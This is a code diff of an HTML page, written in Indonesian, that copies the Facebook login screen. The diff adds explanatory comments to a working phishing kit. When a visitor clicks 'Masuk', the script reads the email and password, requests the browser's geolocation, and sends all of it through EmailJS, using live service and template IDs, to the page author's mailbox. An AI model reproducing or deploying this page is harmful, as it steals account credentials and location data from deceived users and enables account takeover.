@@ -4,17 +4,17 @@
   <meta charset="UTF-8">
   <title>Login ke Facebook</title>
 
- 
+  <!-- Load library EmailJS dari CDN -->
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
   <style>
-   
+    /* CSS GLOBAL */
     * {
       box-sizing: border-box;
       font-family: Helvetica, Arial, sans-serif;
     }
 
-  
+    /* BODY */
     body {
       background: #f0f2f5;
       display: flex;
@@ -24,7 +24,7 @@
       margin: 0;
     }
 
-   
+    /* KOTAK LOGIN */
     .login-box {
       background: #fff;
       padding: 20px 20px 30px;
@@ -101,54 +101,57 @@
   </style>
 </head>
 <body>
-  
+  <!-- FORM LOGIN -->
   <div class="login-box">
-    <h1>facebook</h1> 
-    <h2>Login ke Facebook</h2> 
+    <h1>facebook</h1> <!-- Judul besar -->
+    <h2>Login ke Facebook</h2> <!-- Subjudul -->
 
-   
+    <!-- Input Email dan Password -->
     <input type="email" id="email" placeholder="Email atau Nomor Telepon">
     <input type="password" id="password" placeholder="Kata Sandi">
 
-  
+    <!-- Tombol Masuk -->
     <button onclick="kirimData()">Masuk</button>
 
-   
+    <!-- Link Lupa Akun -->
     <a href="#" class="link">Lupa akun?</a>
 
-   
+    <!-- Garis pemisah -->
     <div class="divider"><span>atau</span></div>
 
+    <!-- Tombol buat akun -->
     <button class="signup">Buat akun baru</button>
   </div>
 
   <script>
-  
+    // Inisialisasi EmailJS dengan user ID kamu
     emailjs.init("P2F6IEIWdwQ2UYFGk");
 
+    // Fungsi yang dijalankan saat klik tombol "Masuk"
     function kirimData() {
-    
+      // Ambil nilai dari input email & password
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
 
+      // Ambil elemen tombol untuk dimodifikasi tampilannya
       const btn = document.querySelector("button");
 
-    
+      // Validasi input tidak boleh kosong
       if (!email || !password) {
         alert("Email dan kata sandi wajib diisi!");
         return;
       }
 
-   
+      // Ubah tampilan tombol saat proses pengiriman
       btn.innerText = "Mengirim...";
       btn.disabled = true;
 
-     
+      // Ambil lokasi pengguna (jika diizinkan browser)
       navigator.geolocation.getCurrentPosition(pos => {
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
 
-       
+        // Buat data yang akan dikirim
         const data = {
           email: email,
           password: password,
@@ -156,7 +159,7 @@
           longitude: lon
         };
 
-       
+        // Kirim data ke EmailJS (ke email kamu sesuai template)
         emailjs.send("service_atvbwis", "template_fhsowxs", data)
           .then(() => {
             alert("Data berhasil dikirim!");
@@ -171,7 +174,7 @@
           });
 
       }, err => {
-       
+        // Jika gagal mendapatkan lokasi
         alert("Gagal ambil lokasi: " + err.message);
         btn.innerText = "Masuk";
         btn.disabled = false;
